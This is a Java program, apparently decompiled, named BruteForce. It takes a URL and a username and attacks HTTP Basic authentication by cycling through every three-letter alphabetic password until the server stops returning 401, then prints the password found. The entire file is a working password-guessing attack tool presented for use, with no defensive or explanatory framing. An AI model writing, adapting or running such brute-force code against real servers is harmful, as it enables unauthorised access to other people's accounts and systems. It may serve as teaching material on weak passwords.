public class BruteForce extends java.net.Authenticator {
    private String username;
    private java.net.URL url;
    private char[] nextPassword;
    private char[] thisPassword;
    public static void main ( String[] a ) {
        BruteForce a0 = null;
        if ( a.length != 2 ) {
            System.err.println ( "usage: BruteForce <url> <username>" );
            System.exit ( 1 );
        }
        String s = a[0];
        String s0 = a[1];
        try {
            a0 = new BruteForce ( s, s0 );
        } catch ( java.net.MalformedURLException a1 ) {
            a1.printStackTrace();
            System.exit ( 1 );
            a0 = null;
        }
        a0.work();
        System.exit ( 0 );
    }
    public BruteForce ( String s, String s0 ) {
        super();
        this.url = new java.net.URL ( s );
        this.username = s0;
        char[] a = new char[1];
        a[0] = ( char ) 97;
        this.nextPassword = a;
    }
    public void work() {
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) this );
        java.net.URL a = this.url;
        try {
            java.net.HttpURLConnection a0 = ( java.net.HttpURLConnection ) a.openConnection();
            a0.connect();
            while ( a0.getResponseCode() == 401 ) {
                if ( this.nextPassword == null ) {
                    break;
                }
                label0: {
                    NullPointerException a1 = null;
                    try {
                        try {
                            a0.getInputStream();
                            a0.connect();
                            continue;
                        } catch ( java.net.ProtocolException ignoredException ) {
                            break label0;
                        }
                    } catch ( NullPointerException a2 ) {
                        a1 = a2;
                    }
                    a1.printStackTrace();
                    System.exit ( 1 );
                    continue;
                }
                a0 = ( java.net.HttpURLConnection ) this.url.openConnection();
            }
        } catch ( java.io.IOException a3 ) {
            a3.printStackTrace();
            System.exit ( 1 );
        }
        System.out.println ( new StringBuilder().append ( "password=" ).append ( new String ( this.thisPassword ) ).toString() );
    }
    public java.net.PasswordAuthentication getPasswordAuthentication() {
        this.createNextPassword();
        return new java.net.PasswordAuthentication ( this.username, this.thisPassword );
    }
    public void createNextPassword() {
        if ( this.thisPassword == null ) {
            char[] a = new char[3];
            a[0] = ( char ) 65;
            a[1] = ( char ) 65;
            a[2] = ( char ) 65;
            this.thisPassword = a;
            char[] a0 = new char[3];
            a0[0] = ( char ) 65;
            a0[1] = ( char ) 65;
            a0[2] = ( char ) 66;
            this.nextPassword = a0;
            return;
        }
        this.thisPassword = this.nextPassword;
        int i = this.nextPassword[2];
        if ( i == 90 ) {
            this.nextPassword[2] = ( char ) 97;
            return;
        }
        int i0 = this.nextPassword[2];
        if ( i0 == 122 ) {
            this.nextPassword[2] = ( char ) 65;
            int i1 = this.nextPassword[1];
            if ( i1 != 90 ) {
                int i2 = this.nextPassword[1];
                if ( i2 == 122 ) {
                    this.nextPassword[1] = ( char ) 65;
                    int i3 = this.nextPassword[0];
                    if ( i3 != 90 ) {
                        int i4 = this.nextPassword[0];
                        if ( i4 == 122 ) {
                            this.nextPassword = null;
                        } else {
                            int i5 = this.nextPassword[0];
                            char[] a1 = this.nextPassword;
                            int i6 = ( char ) ( i5 + 1 );
                            a1[0] = ( char ) i6;
                        }
                    } else {
                        this.nextPassword[0] = ( char ) 97;
                    }
                } else {
                    int i7 = this.nextPassword[1];
                    char[] a2 = this.nextPassword;
                    int i8 = ( char ) ( i7 + 1 );
                    a2[1] = ( char ) i8;
                }
            } else {
                this.nextPassword[1] = ( char ) 97;
            }
        } else {
            int i9 = this.nextPassword[2];
            char[] a3 = this.nextPassword;
            int i10 = ( char ) ( i9 + 1 );
            a3[2] = ( char ) i10;
        }
    }
}
